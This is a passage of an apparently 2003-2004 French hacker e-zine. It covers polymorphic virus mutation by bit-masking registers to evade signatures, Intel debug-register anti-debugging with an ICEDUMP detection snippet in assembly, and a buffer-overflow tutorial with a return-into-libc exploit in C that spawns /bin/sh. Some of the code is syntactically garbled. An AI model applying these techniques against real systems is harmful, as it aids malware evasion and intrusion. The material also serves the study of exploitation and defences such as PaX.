    le m&ecirc;me octet. Maintenant, en entrant au coeur du motif binaire de l'instruction, 
    on retombe sur nos pieds et on arrive &agrave; identifier un &eacute;l&eacute;ment 
    en particulier dans un octet. Au coeur de l'octet repr&eacute;sentant l'instruction, 
    on se retrouve tout simplement en face d'un b&ecirc;te compteur sur deux bits, 
    un v&eacute;ritable index du registre &agrave; utiliser.</p>
  <p></p>
  <p></p>
  <p>V - Masquage de bits<br>
    -----------------------</p>
  <p>A ce stade, il est facile de rep&eacute;rer par quelles manipulations logiques 
    on peut transformer une op&eacute;ration sur un registre en la m&ecirc;me 
    op&eacute;ration sur un registre diff&eacute;rent. Dans le cas qui nous concerne 
    pour chaque registre il y a deux formules distinctes et un cas o&ugrave; les 
    deux sont &agrave; utiliser &agrave; la suite.</p>
  <p><br>
    Quelques rappels de logique binaire, avant tout :<br>
    Mise &agrave; z&eacute;ro d'un bit : ? and 0 -&gt; 0<br>
    Mise &agrave; un d'un bit : ? or 1 -&gt; 1</p>
  <p><br>
    Arm&eacute; de ces rappels, effectuer la translation de registre d'une instruction, 
    et par extension d'une routine, ne pose plus r&eacute;ellement de probl&egrave;me. 
    A partir de n'importe quelle valeur initiale parmi les quatre, il est possible 
    d'obtenir n'importe quelle autre de ces valeurs au moyen de masquages de bits. 
    Le tableau suivant r&eacute;capitule les masquages &agrave; faire, et souligne 
    les deux formules qu'on peut alors utiliser.</p>
  <p>+-------------+-------------+-------------+-----------+-----------------------------+<br>
    | EAX | ECX | EDX | EBX | Fonct. | <br>
    Formule |<br>
    +-------------+-------------+-------------+-----------+-------------------+---------+<br>
    | and FC | and FD or 1 | and FE or 2 | or 3 | mov reg64, &quot;xxxx&quot; 
    | <br>
    1 |<br>
    | | | | | | |<br>
    +-------------+-------------+-------------+-----------+-------------------+---------+<br>
    | and (FC&lt;&lt;3) | and (FD&lt;&lt;3) | and (FE&lt;&lt;3) | or (3&lt;&lt;3) 
    | mov [ebx+x], reg | <br>
    2 |<br>
    | | or (1&lt;&lt;3) | or (2&lt;&lt;3) | | | <br>
    |<br>
    +-------------+-------------+-------------+-----------+-------------------+---------+<br>
    | and FC | and FD or 1 | And FE or 2 | or 3 | xor reg16, reg16 | <br>
    1 + 2 |<br>
    | and (FC&lt;&lt;3) | and (FD&lt;&lt;3) | and (FE&lt;&lt;3) | or (3&lt;&lt;3) 
    | Formule 1 + 2 | <br>
    |<br>
    | | or (1&lt;&lt;3) | or (2&lt;&lt;3) | | | <br>
    |<br>
    +-------------+-------------+-------------+-----------+-------------------+---------+<br>
    | and FC | and FD or 1 | and FE or 2 | or 3 | Mov reg8, &quot;x&quot; | <br>
    1 |<br>
    +-------------+-------------+-------------+-----------+-------------------+---------+</p>
  <p><br>
    En appliquant le bon lot de formules selon la translation de registre souhait&eacute;e, 
    on modifie le registre utilis&eacute; par le bout de code. Il faut juste se 
    souvenir qu'&agrave; tel offset du code de la <br>
    routine il faut utiliser la formule 1, 2, ou bien les deux simultan&eacute;ment. 
    Pour cela, une petite table permet de dire qu'&agrave; tel offset de la routile 
    on doit appliquer telles formules.</p>
  <p>+--------+------------+<br>
    | Offset | Formule(s) |<br>
    +--------+------------+<br>
    | 0d | 1 |<br>
    | 6d | 2 |<br>
    | 8d | 1 |<br>
    | 14d | 2 |<br>
    | 17d | 1 |<br>
    | 22d | 2 |<br>
    | 26d | 1+2 |<br>
    | 27d | 1 |<br>
    | 31d | 2 |<br>
    +--------+------------+</p>
  <p></p>
  <p></p>
  <p>VI - Rafinement du polymorphisme d'instruction<br>
    -------------------------------------------------</p>
  <p>On a vu que des fonctions peuvent incorporer des instructions ne servant 
    &agrave; rien, seulement &agrave; brouiller d'avantage les signatures. Avec 
    la m&eacute;thode du motif de bit, on gagne encore plus de flexibilit&eacute;. 
    Le moteur de mutation doit alors s'assurer de deux param&egrave;tres :</p>
  <p><br>
    Les instructions &quot;r&eacute;elles&quot; de la fonction doivent subir un 
    masquage de bits afin de fonctionner avec un registre principal &quot;actif&quot; 
    qui servira pour le bon d&eacute;roulement. Les instructions &quot;pipeau&quot; 
    de la fonction doivent subir un masquage de bits afin de fonctionner avec 
    un des trois autres registres principaux, pouvant ainsi faire n'importe quoi 
    sans alt&eacute;rer le registre de travail &quot;actif&quot;.</p>
  <p></p>
  <p></p>
  <p>VII - Note concernant Windows<br>
    ----------------------------------</p>
  <p>Entre DOS et Windows, que de changements. L'un d'entre eux concerne directement 
    ce domaine. Sous DOS, rien n'emp&ecirc;che de manipuler le code comme s'il 
    s'agissait de donn&eacute;es, et donc de modifier directement les octets du 
    segment de code. Cette possibilit&eacute; permettait une grande souplesse 
    dans la mutation de code ainsi que de mettre en place des strat&eacute;gies 
    anti d&eacute;buggage jouant sur le prefetch des processeurs, assez r&eacute;pandus 
    sur les 486.</p>
  <p><br>
    Sous Windows NT, le code est le code, et les donn&eacute;es sont les donn&eacute;es. 
    On ne m&eacute;lange pas les torchons et les serviettes, pas vrai ? Le gestionnaire 
    de pages de m&eacute;moire virtuelle de Windows NT permet de bloquer l'acc&egrave;s 
    en lecture ou &eacute;criture sur certains segments. Et il est de coutume 
    que le segment de code soit prot&eacute;g&eacute; contre l'&eacute;criture.</p>
  <p><br>
    Deux solutions. Soit penser &agrave; d&eacute;verrouiller la page de code 
    au moyen des API adapt&eacute;es, soit traviller dans des buffer contenus 
    dans le segment de donn&eacute;es, stack ou heap.</p>
  <p></p>
  <p></p>
  <p>VIII - Conclusion<br>
    ----------**-------</p>
  <p>Le polymorphisme sub-instruction s'av&egrave;re assez ais&eacute; &agrave; 
    mettre en place. Combin&eacute; avec les autres niveaux o&ugrave; peut intervenir 
    le polymorphisme, les r&eacute;sultats sont tr&egrave;s satisfaisants. Mon 
    but n'est pas de donner un outil clef en main, et dont la compr&eacute;hention 
    est en option. Donc pas plus de code que &ccedil;a.</p>
  <p>Intel a publi&eacute; un pdf nomm&eacute; &quot;instruction set reference&quot;. 
    Je m'attendais &agrave; y trouver facilement les motifs de bits des instructions 
    en fonction des registres mis en jeu, mais son usage n'est <br>
    franchement pas tr&egrave;s ais&eacute;. La m&eacute;thode empirique reste 
    encore plus facile.</p>
  <p><br>
    J'esp&egrave;re que cette plong&eacute;e au coeur de l'instruction vous aura 
    rappell&eacute; l'Aventure Int&eacute;rieure !</p>
  <p>++ tolwin / DHS</p>
  <p><span lang=EN-GB style='mso-ansi-language:EN-GB'>&nbsp;<o:p></o:p></span></p>
  <p align=center style='text-align:center'><b><span lang=EN-GB style='font-size:
10.0pt;font-family:Arial;color:red;mso-ansi-language:EN-GB'>...::: Advanced Virii 
    By</span><span
lang=EN-GB style='font-size:10.0pt;font-family:Arial;mso-ansi-language:EN-GB'> 
    tolwin</span><span lang=EN-GB style='font-size:10.0pt;font-family:Arial;
color:red;mso-ansi-language:EN-GB'>:::...</span></b><span lang=EN-GB
style='mso-ansi-language:EN-GB'><o:p></o:p></span></p>

  <p><span lang=EN-GB style='font-size:10.0pt;font-family:Verdana;mso-ansi-language:
EN-GB'>===================================================================== <br>
    3 . : </span><span lang=NL style='font-size:10.0pt;font-family:Verdana;mso-ansi-language:
NL'><b>Les Registres Debug d'Intel et le bit GD du registre DR7</b></span><span lang=EN-GB style='font-size:10.0pt;font-family:Verdana;mso-ansi-language:
EN-GB'><br>
    =====================================================================</span><span
lang=EN-GB style='mso-ansi-language:EN-GB'><o:p></o:p></span></p>

  <p><span lang=EN-GB style='font-size:10.0pt;font-family:Arial;mso-ansi-language:
EN-GB'>Date : 07/12/2003<br>
    Auteur : </span><span style='font-size:10.0pt;font-family:Arial'><a
href="mailto:etherlord@ziplip.com"><span lang=EN-GB style='mso-ansi-language:
EN-GB'>Etherlord</span></a></span><span lang=EN-GB style='font-size:10.0pt;
font-family:Arial;mso-ansi-language:EN-GB'><br>
    Produit : </span><span lang=EN-GB style='mso-ansi-language:EN-GB'><o:p>Processeurs 
    Intel. </o:p></span></p>

  <p><span lang=EN-GB style='mso-ansi-language:EN-GB'><br>
    0 .Introduction<br>
    ----------------</span></p>
  <p>Avec l'&eacute;volution des microprocesseurs, les besoins ont &eacute;galement 
    &eacute;volu&eacute;s. Si les premiers microprocesseurs n'impliquaient aucune 
    &eacute;mulation, ce n'est plus le cas des microprocesseurs actuels. Sans 
    l'appui du processeur, certaines taches sont impossibles &agrave; r&eacute;aliser. 
    Si l'&eacute;mulation n'avait pas &eacute;t&eacute; introduite comme composant 
    interne d'un microprocesseur (ICE:In-Circuit Emulation), il ne serait pas 
    possible aujourd'hui d'arr&ecirc;ter le microprocesseur au milieu d'un programme 
    (breakpoint), ni m&ecirc;me songer &agrave; tracer une instruction...</p>
  <p>Avec l'evolution du marche, les microprocesseurs ont vu leurs posibilit&eacute;s 
    &agrave; ce niveau augmenter (les premi&egrave;res instructions relatives 
    a l'&eacute;mulation sont apparues sur le 80186, instructions ajout&eacute;es 
    ou amelior&eacute;es ensuite &agrave; chaque parution d'une nouvelle 'famille' 
    de microprocesseur). Le 80386 a vu apparaitre les registres DEBUG, le pentium 
    quand a lui presente une toute nouvelle<br>
    facon de g&eacute;rer l'&eacute;mulation.</p>
  <p>Ce papier a pour but de vous presenter un bit un peu particulier d'un des 
    registre Debug d'Intel. Bit qui peut &ecirc;tre utilis&eacute; par une application 
    pour determiner si elle est sous l'emprise d'un debuggeur.</p>
  <p></p>
  <p>I.Les registres DRx<br>
    -------------------</p>
  <p>Les processeurs Intels Pentium contiennent 8 registres appeles 'Debug'. Ces 
    registres sont notes de DR0 a DR7. Les registres DR4 et DR5 sont actuellement 
    reserv&eacute;s.</p>
  <p>Ces registres sont utilises pour fixer des point d'arrets dans un programme 
    (breakpoints), mais attention, des points d'arr&ecirc;ts un peu sp&eacute;ciaux, 
    aussi appel&eacute;s HARDWARE BREAKPOINT. On utilise la notation HARDWARE, 
    car ces point d'arr&ecirc;ts utilisent les registres internes DRx du CPU. 
    Il est possible de fixer un maximum de 4 points d'arr&ecirc;ts, des registres 
    DR0 a DR3.</p>
  <p>Le registre DR6 contient des informations sur le status des point d'arrets. 
    Le premier nibble (un nibble = 4 octets) utilise 1 bit pour chaque point d'arr&ecirc;t. 
    Le bit du nibble est d&eacute;fini &agrave; 1 quand le point d'arr&ecirc;t 
    rencontre sa condition d'&eacute;tablissement. Point int&eacute;ressant, le 
    bit est defini MEME QUAND LE POINT D'ARRET N'EST PAS ACTIF. Une protection 
    logicielle peut d&eacute;j&agrave; jouer sur<br>
    ce fait pour d&eacute;terminer si les registres DR0 &agrave; DR3 sont utilis&eacute;s.</p>
  <p>Le registre DR7 contient les propri&eacute;t&eacute;s des points d'arr&ecirc;ts. 
    Le premier byte<br>
    concerne la localisation du point d'arr&ecirc;t, a noter qu'une des propri&eacute;t&eacute;s 
    des points d'arr&ecirc;ts est d'&ecirc;tre execut&eacute;e pour une tache 
    pr&eacute;cise, ou pour toutes les t&acirc;ches. Ces drapeaux sont respectivements 
    not&eacute;s L (Local) et G (Global)</p>
  <p><br>
    I.a.Exploitation des registres DRx pour d&eacute;sactiver/d&eacute;tecter 
    un d&eacute;buggeur<br>
    ------------------------------------------------------------------------</p>
  <p>c'est une technique assez simple, en fait, les registres DRx etant exploit&eacute;s 
    par un d&eacute;buggeur pour d&eacute;finir des point d'arr&ecirc;ts, un programme 
    qui utilise l'API SetThreadContext (le but &eacute;tant d'atteindre le Ring 
    0 de mani&egrave;re transparente) et qui va vider les registres DRx va rendre 
    ineffectif tout point-d'arr&ecirc;ts d&eacute;finis par le d&eacute;buggeur. 
    Une solution &eacute;l&eacute;gante pour le moins :)</p>
  <p>Une autre technique de protection pour un programme peut &ecirc;tre d'utiliser 
    les registres DRx comme partie d'un calcul. L'utilisation d'un d&eacute;buggeur 
    va modifier les registres DRx, faussant alors le<br>
    calcul. Si ce dernier est utilis&eacute; pour calculer un pointeur, on est 
    sur de provoquer une exception si le programme tourne sous l'emprise d'un 
    d&eacute;buggeur.</p>
  <p><br>
    II.Le registre DR7 et son GD<br>
    -------------------------------</p>
  <p>Voyons tout d'abord d'un petit peu plus pr&eacute;s les sp&eacute;cifications 
    du registre DR7:</p>
  <p>&lt;(31)-- Debug Register 7 <br>
    --(0)&gt;<br>
    Len|R/W|Len|R/W|Len|R/W|Len|R/W|TT|TB|GD|IR|x|x|GE|LE|G3|L3|G2|L2|G1|L1|G0|L0|<br>
    3 | 3 | 2 | 2 | 1 | 1 | 0 | 0 |</p>
  <p><br>
    Le registre DR7 contient les sp&eacute;cifications des points d'arr&ecirc;ts. 
  </p>
  <p>Les 8 premiers bits (L0,G0....G3) sont consacr&eacute;s &agrave; d&eacute;finir 
    la localisation des 4 points d'arr&ecirc;ts hardware: pour chaque point d'arr&ecirc;t, 
    on peut definir si la condition s'applique (L)ocalement (processus seul) ou 
    (G)lobalement (tous les process) les bits 8 et 9 contiennnent le point d'arr&ecirc;t 
    exacte (Local et Global), cela signifie que lorsqu'une exception debug apparait, 
    le debugger connait l'instruction exacte qui as cause l'exception.</p>
  <p>les bits 10 et 11 sont reserv&eacute;s.</p>
  <p>le bit 12 est le bit IR (Interrupt Redirection). Quand ce bit est defini, 
    l'&eacute;mulateur (ICE) suspend l'ex&eacute;cution du processus quand une 
    condition d'un pont-d'arr&ecirc;t (n'importe lequel) est atteinte.</p>
  <p>le bit 13 est le bit GD (General Detection, aussi connu sous le nom Global 
    Debug). Quand ce bit est d&eacute;fini, il d&eacute;tect&eacute; les acc&egrave;s 
    aux diff&eacute;rents registres DRx, quand une interaction apparait entre 
    une application et les registres DRx, si le bit GD est d&eacute;fini a ce 
    moment l&agrave; une interruption (INT 1) est g&eacute;n&eacute;r&eacute;e. 
    Une fois que l'interruption a &eacute;t&eacute; ex&eacute;cut&eacute;e, le 
    bit GD est re-initialis&eacute;.</p>
  <p>le bit 14 (Trace) g&eacute;n&eacute;r&eacute; un cycle sp&eacute;cial du 
    CPU &agrave; chaque fois qu'une discontinuit&eacute; intervient dans l'interpr&eacute;tation 
    d'un code. L'&eacute;mulateur (ICE) liste ce cycle sp&eacute;cial et le stoque 
    dans les donn&eacute;es de trace. Cela permet au CPU de reconstruire des s&eacute;quences 
    de code d'apr&egrave;s les donn&eacute;es de trace.</p>
  <p>le bit 15 fait partie de ces aires non document&eacute;es par Intel. Potentiellement 
    peut &ecirc;re utilis&eacute; en compl&eacute;ment du bit 14.</p>
  <p>les bits 16 a 29 d&eacute;crivent les condition pour lesquels un point d'arr&ecirc;t 
    est effectif. Chaque condition prends 2 bits. Ensuite vient la longueur (1, 
    2 ou 4 bits).</p>
  <p>0(00) = BP a l'ex&eacute;cution<br>
    1(01) = BP sur l'&eacute;criture de donn&eacute;e<br>
    3(11) = BP sur l'&eacute;criture et la lecture de donn&eacute;e</p>
  <p></p>
  <p>II.a.L'utilite du bit GD<br>
    ------------------------</p>
  <p>Quelle peut &ecirc;tre l'utilit&eacute; de ce bit au niveau d'une protection 
    ? </p>
  <p>Le bit GD PROTEGE les registres debug (inclus les applications en Ring 0). 
    Si ce bit est actif, tous les acc&egrave;s ecriture/lecture des registres 
    debug vont entrainer une exception (INT 1). Cette exception peut &ecirc;tre 
    rattrap&eacute;e par un 'Exception Handler'. Lorsqu'on se trouve dans la partie 
    de l'exception handler, le processeur reinitialis&eacute; le bit GD. A ce 
    moment, il est possible de jouer<br>
    avec les registres debug et ensuite de restaurer le bit GD a la sortie de 
    la routine. Une protection peut exploiter cet &eacute;tat de fait pour determiner 
    si elle tourne sous l'action d'une autre application (trace ou debug), par 
    exemple, l'application ICEDUMP r&eacute;initialise le bit GD a l'ex&eacute;cution, 
    il suffit donc d'&eacute;tablir ce bit, de provoquer une exception et de relire 
    le bit pour d&eacute;terminer la pr&eacute;sence de cette application.</p>
  <p></p>
  <p>II.b.Utilisation du bit GD pour detecter ICEDUMP<br>
    ----------------------------------------------------</p>
  <p>Un exemple &eacute;tant souvent plus parlant que des mots, voici un exemple 
    de code pour d&eacute;tecter la pr&eacute;sence de ICEDUMP:</p>
  <p><br>
    ; Credit to ^DAEMON^ for this snippet <br>
    ; Many thx for the valuable infos on your site.<br>
    ;</p>
  <p>Code<br>
    main: push offset handler<br>
    push dword ptr fs:[0]<br>
    mov dword ptr fs:[0],esp ; On cr&eacute;e une nouvelle exception<br>
    handler<br>
    db 08dh,0c0h ; on provoque une exception<br>
    nop ; c'est le 'single-step'<br>
    necessaire apres l'exception<br>
    push 0<br>
    .....<br>
    &lt;code du programme&gt;</p>
  <p> ......<br>
    call ExitProcess ; fin du processus</p>
  <p>;-----------------------------------------------;<br>
    ; ici comment l'exception handler<br>
    ;-----------------------------------------------<br>
    handler:<br>
    mov eax,[esp+04h]<br>
    mov ebx,[esp+0ch] ; on r&eacute;cup&egrave;re le pointeur<br>
    de la structure context<br>
    cmp dword ptr [eax],080000004h ; single-step ???<br>
    je int_1<br>
    and dword ptr [ebx+014h],0 ; on r&eacute;initialise le registre<br>
    DR6<br>
    bts dword ptr [ebx+018h],013 ; on d&eacute;fini le bit GD<br>
    bts dword ptr [ebx+0c0h],08h ; on d&eacute;fini le trap<br>
    add dword ptr [ebx+0b8h],02h <br>
    jmp retu<br>
    int_1:bt dword ptr [ebx+018h],013 ; on v&eacute;rifie l'&eacute;tat de<br>
    notre bit GD<br>
    jc retu ; si pas de modif, pas<br>
    de ICEDUMP<br>
    inc found ; ICEDUMP d&eacute;tect&eacute;<br>
    retu: xor eax,eax<br>
    ret ; return de l'exception<br>
    handler<br>
    End Main </p>
  <p></p>
  <p><br>
    ++ etherlord / DHS</p>
  <p><br>
    References :</p>
  <p>- Intel Architecture Software Developper's Manual<br>
    http://www.intel.com/design/pro/manuals/</p>
  <p>- In-Circuit Emulation - R.R.Collind<br>
    http://www.rcollins.org/ddj/Sep97/Sep97.html</p>
  <p>- Yates2k - Debug Register &amp; Explanation<br>
    http://www.yates2k.net/sysinfo.html<span lang=EN-GB style='mso-ansi-language:EN-GB'><o:p></o:p></span></p>
  <p><span lang=EN-GB style='mso-ansi-language:EN-GB'><o:p></o:p></span><span lang=EN-GB style='mso-ansi-language:EN-GB'>&nbsp;<o:p></o:p></span></p>

<p align=center style='text-align:center'><b><span lang=EN-GB style='font-size:
10.0pt;font-family:Arial;color:red;mso-ansi-language:EN-GB'>...::: Shatter
Attacks By</span></b><b><span lang=EN-GB style='font-size:10.0pt;font-family:
Arial;mso-ansi-language:EN-GB'> Etherlord</span></b><b><span lang=EN-GB
style='font-size:10.0pt;font-family:Arial;color:red;mso-ansi-language:EN-GB'>:::...</span></b><span
lang=EN-GB style='mso-ansi-language:EN-GB'><o:p></o:p></span></p>

  <p><span lang=EN-GB style='mso-ansi-language:EN-GB'>&nbsp; 
    
    <o:p></o:p></span></p>

<p><span style='font-size:10.0pt;font-family:Verdana'>=====================================================================
<br>
    4 . VIRUS : <b>INTRODUCTION AUX VIRUS ELF</b> </span><b><span style="font-family: Arial; font-size: 10.0pt;"> 
    - </span><span style='font-size:
10.0pt;font-family:Arial'>Part 2</span></b><span style='font-size:10.0pt;font-family:
Verdana'><br>
===================================================================== </span></p>

  <p style='margin-bottom:12.0pt'><span style='font-size:10.0pt;font-family:Arial'>Date 
    : 01/01/2003<br>
    Auteur : <a href="mailto:deepfear@netcourrier.com">deepfear</a></span></p>

<p><span lang=EN-GB style='mso-ansi-language:EN-GB'>Introduction :<o:p></o:p></span></p>

<p align=center style='text-align:center'><span lang=EN-GB style='mso-ansi-language:
EN-GB'><br>
    </span><b><span lang=EN-GB style='font-size:10.0pt;font-family:Arial;
color:red;mso-ansi-language:EN-GB'>...::: ELF Infector By</span><span
lang=EN-GB style='font-size:10.0pt;font-family:Arial;mso-ansi-language:EN-GB'> 
    deepfear</span><span lang=EN-GB style='font-size:10.0pt;font-family:
Arial;color:red;mso-ansi-language:EN-GB'>:::...</span></b><span lang=EN-GB
style='mso-ansi-language:EN-GB'><o:p></o:p></span></p>

<p align=center style='text-align:center'><span lang=EN-GB style='mso-ansi-language:
EN-GB'>&nbsp;<o:p></o:p></span></p>

<p><span lang=EN-GB style='font-size:10.0pt;font-family:Verdana;mso-ansi-language:
EN-GB'>===================================================================== <br>
    5 . HACKING : </span><b><span lang=EN-GB style='font-size:10.0pt;font-family: Arial;mso-ansi-language:EN-GB'>ADVANCED 
    BUFFER OVERFLOWS EXPLOITATION : BYPASSING PAX PROTECTION</span></b><span
lang=EN-GB style='font-size:10.0pt;font-family:Verdana;mso-ansi-language:EN-GB'><br>
===================================================================== </span><span
lang=EN-GB style='mso-ansi-language:EN-GB'><o:p></o:p></span></p>

  <p><span style='font-size:10.0pt;font-family:Arial'>Date : 20/02/2004<br>
Auteur : <a href="mailto:slickers@6sens.com">Nocte</a></span></p>

  <p>--------------------------------------------------------<br>
    Sommaire : <br>
    --------------------------------------------------------<br>
    - 1. Retunr into libc<br>
    - 2. Return into plt<br>
    - 3.1 Bypassing paX aslr protection<br>
    - 3.2 Conditions de l'exploitation<br>
    - 5. ELFsh project<br>
    - 6. Conclusion<br>
    - 7. R&eacute;f&eacute;rences<br>
    --------------------------------------------------------</p>
  <p>Attention : ce paper ne pr&eacute;sente en aucune fa&ccedil;on de nouvelles 
    &eacute;tudes sur le sujet, mais proprose une synth&egrave;se sur les recherches 
    actuellement en cours dans ce domaine.</p>
  <p><br>
    Les failles de type buffers overflows sont assur&eacute;ment les plus exploit&eacute;s, 
    parmi tous les OS existants. Pourquoi ? Une quantit&eacute; astronomique d'informations, 
    dont des papers incontournables [6], sur ce genre de faille et d'exploits 
    tout faits existent sur le Net, et un simple clic suffit dor&eacute;navant 
    pour exploiter cette faille. Qui dit buffer overflows, dit shellcodes. Nous 
    avions d&eacute;j&agrave; parl&eacute; pr&eacute;c&eacute;demment des diff&eacute;rentes 
    techniques pour mettre aux points des shellcodes avanc&eacute;s [1]. Pour 
    parer &agrave; cette faille, des patchs sont sortis, dont le fameux projet 
    PaX (pour PageEXec). Il s'agit d'un patch de protection (disponible &agrave; 
    [5]) pour le kernel linux &agrave; l'encontre des attaques par buffer overflow. 
    Ce patch rend la stack non-ex&eacute;cutable. De nouvelles version de ce patch 
    contiennent maintenant une protection efficace contre les attaque par return 
    inot libc [3] afin de les rendre plus difficile d'exploitation, et les derni&egrave;res 
    protections de type ASLR les rend resque impossible en pratique [2].</p>
  <p>1. RETURN INTO LIBC<br>
    ----------------------------</p>
  <p>Examinons avec attention comment les rutn into libc permettent de tromper 
    les patch de s&eacute;curit&eacute;s et exploiter malgr&eacute; tout des failles 
    de type buffer overflows. Dans son &quot;Getting around non-executable stack&quot; 
    post&eacute; sur buqtraqde securityfocus, Solar Designer est officiellement 
    l'inventeur des return into libc. Plus tard, Nergal inventa des variantes 
    plus coriaces qui permettaient l'exploitation de cette technique malgr&eacute; 
    les nouvelles parades des patchs de PaX, e introduisant les &quot;return into 
    plt&quot; notamment et d'autres techniques de return into libc. </p>
  <p> Les return into libc permettent l'exploitation des BOF sans avoir recours 
    &agrave; un shellcode. Techniquement, cette attaque consiste &agrave; modifier 
    le stack pointer, et le d&eacute;placer sur une s&eacute;quence d'adresses 
    de proc&eacute;dures ex&eacute;cutables, de mani&egrave;re &agrave; simuler 
    des frames de confctions dont le code est d&eacute;j&agrave; pr&eacute;sent 
    dans le processus. Pour cela, les adresses des fonctions et de certains de 
    leurs param&egrave;tres sont n&eacute;cessaires, et lors du 'ret' de la fonciton 
    vuln&eacute;rable, la s&eacute;quence de foncitons est ex&eacute;cut&eacute;e 
    ce qui ne n&eacute;cessite plus l'ex&eacute;cution de code. Ainsi, on peut 
    ais&eacute;ment contourner une protections non-ex&eacute;cutable (au niveau 
    de la stack ou du heap) ; par ailleurs, cette m&eacute;thode peut &ecirc;tre 
    utile dans le cas d'exploitation de BOF impliquant des buffers trop petits 
    pour y placer un shellcode.</p>
  <p>Nous n'allons pas reprendre ici les bases des failles de buffer overflows 
    (voir [1]). Rappelons quelques id&eacute;es. Les exploits de buffers overflows 
    tentent d'&eacute;craser l'adresse de retour d'une fonction par une valeur 
    qui pointe g&eacute;n&eacute;ralement vers le buffer vuln&eacute;rable. L'adresse 
    de retour d'une faonction, sauvegard&eacute; sur la pile, est une sauvegarde 
    du registre EIP (qui contient l'adresse de la prochaine instruction &agrave; 
    ex&eacute;cuter). Ainsi, si on modifie la sauvegarde du registre EIP, au retour 
    de la fonction, le flux d'ex&eacute;cution sera d&eacute;tourn&eacute; et 
    continuera l&agrave; o&ugrave; pointe cete nouvelle adresse modifi&eacute;e.</p>
  <p>Soit le programme <br>
    --vuln.c--<br>
    #include &lt;string.h&gt;<br>
    int main(int argc, char **argv)<br>
    {<br>
    char buffer[64];<br>
    strcpy(buffer, argv[1]);<br>
    return(0);<br>
    }</p>
  <p>Faile classique de buffer overflow au niveau de strcpy().</p>
  <p>Dans le cas d'un return into libc, nous allons modifier cette sauvegarde 
    du registre EIP, afin de faire retourner la fonction courante (ici, la fonction 
    main)sur une fonction de la libC, ce qui modifiera le flux d'ex&eacute;cution 
    de la fonction. Evidemment, cela implique conna&icirc;tre l'adresse de la 
    fonciton a ex&eacute;cuter. Ce pourrait &ecirc;tre system() par exemple. Avec 
    gdb on peut &quot;r&eacute;soudre&quot; l'adresse de ce symbole dans la biblioth&egrave;que 
    ainsi :</p>
  <p>(gdb) p &amp; system<br>
    $1 = 0x4005529b &lt;system&gt;</p>
  <p>Maintenant, il nous faut simuler une frame correcte pour effectuer l'appel 
    d'une fonction sur la pile.<br>
    Gagstuck ous donne un exemple d'exploit classique que l'on peut utiliser pour 
    exploiter un return into libc tout b&ecirc;te :</p>
  <p>#include &lt;string.h&gt;<br>
    #include &lt;unistd.h&gt;</p>
  <p>#define TARGET &quot;./vuln&quot;<br>
    #define copy(a,b) *((int *) &amp;buf[a])=b<br>
    #define CMD &quot;/bin/sh&quot; //arg[1] de system()<br>
    #define PAD 68 // nb d'octets avant eip<br>
    #define SYSTEM 0x4005529b // adresse de system() dans libc<br>
    #define RET 0xbadc0ded // retour de system()<br>
    #define ARG (0xc0000000 - 4 - sizeof(CMD) - sizeof(TARGET)) // calacule de 
    l'arg 1 (&quot;/bin/sh&quot;) dans l'environnement (cela facilite le calcul 
    de le placer dedans).</p>
  <p>int main(int argc, char **argv) {<br>
    char *arg[] = {TARGET? NULL? NULL }.<br>
    CHAR *ENV[] + {CMD, NULL};<br>
    char buf[PAD + 12];</p>
  <p>memset(buf, 'A', PAD + 12);</p>
  <p>copy(PAD, SYSTEM);<br>
    copy(PAD + 4, RET);<br>
    copy(PAD + 8, ARG);<br>
    arg[1] = buf;<br>
    execve(arg[0], arg, env);</p>
  <p>return (0);</p>
  <p>il suffit de le lancer, et &quot;/bin/sh&quot; est ex&eacute;cut&eacute;. 
    le programme termine par un segfault quand il tente de retourner sur l'adresse 
    de retour fictive &quot;0xbadc0ded&quot;</p>
  <p><br>
    2. RETURN INTO PLT<br>
    --------------------------</p>
  <p>Face &agrave; cette attaque, PaX a vite r&eacute;agit et a con&ccedil;u une 
    d&eacute;fense simple et efficace. Le but es de g&eacute;n&eacute;rer un alea 
    sur toutes les adresses bases des librairies en modifiant le comportement 
    de mmap. Cela rend alors l'exploitation du return into libc plus difficile 
    car, pour exploiter cette techniques, on part du principe que les adrese de 
    la libc sont des valeurs absolues et ne changent pas.<br>
    Quelques temps plus tard, Nergal fut le pr&eacute;cursseur de l'exploitation 
    avanc&eacute;e de &quot;return into libc&quot; : les return into PLT (Procedure 
    Linkable Table). AInsi, au lieu de retourner directement dans une fonciton 
    de la libc (cela &eacute;tant rendu impossible par les nouveaux patchs de 
    s&eacute;curit&eacute;s PaX), l'id&eacute;e est de retourner dans une zone 
    de m&eacute;moire du processus, la PLT. Elle contient les appels aux routines 
    des diff&eacute;rents biblioth&egrave;ques entre autres. Cette zone reste 
    mapp&eacute;e &agrave; des adresses fixes. En &eacute;largissant, les foncitons 
    dans les sections .plt ou .text. peuvent &ecirc;tre utilis&eacute;s.</p>
  <p> Il est complexe de stopper cette attaque, car un grand nombre dadresses 
    absolues sont cod&eacute;es en dur dans un binaire, par exemple dans son en-t&ecirc;te, 
    ses sections de code (.text., .plt), ses sections de donn&eacute;es (.got, 
    .data, .rodata), sa seciton dynamique (.dynamic), sa section de symboles dynamiques 
    (.dynsym), sa section got (.got) et autres section de constructeurs et destructeurs. 
  </p>
  <p> Gr&acirc;ce au projet PaX, il existe une protection syst&egrave;me contre 
    ces attaques dites : ASLR (Address Space Layout Randomization). Elle permet 
    de bloquer l'exploitation bas&eacute;es sur la pr&eacute;diction d'adresses, 
    comme els buffers overflow par return into libc ou return into PLT. Son principe 
    consiste &agrave; mapper 2 fois le binaire dans le processus, l'un aux adresses 
    du binaire, dont l'acc&egrave;s va &ecirc;tre filtr&eacute; par le m&eacute;canisme 
    de page fault, et l'autre &agrave; une adresse al&eacute;atoire. Quand l'instance 
    du code remapp&eacute;e acc&egrave;de aux segments d'origine par ses isntructions 
    d'adressage absolue, la r&eacute;f&eacute;rence est patch&eacute;e dynamiquement 
    depuis le handler de PF. Cette impl&eacute;mentation au niveau kernel fait 
    souffrir la machine pro&eacute;t&eacute;ge INTEL d'une chute de performance 
    de 200% (sur un kernel linux, avec l'option RANDEXEC activ&eacute; sur tous 
    les binaires) d&ucirc;e aux tehcniques utilis&eacute;es (entre autre, le d&eacute;tournement 
    du handler de page fault depuis le kernel).</p>
  <p> Cette protection semble tr&egrave;s difficile &agrave; contourner en pratique 
    par buffer overflow. R&eacute;cemment, en 2003, Tyler Durden, a montr&eacute; 
    comment il &eacute;t&eacute; possible de bypasser la protection ASLR des protections 
    PaX. Toutefois, cet article montre que cette exploitation est extr&ecirc;mement 
    dure et demande beaucoup de conditions.</p>
  <p>3.1 BYPASSING PAX ASLR PROTECTION<br>
    -------------------------------------------------</p>
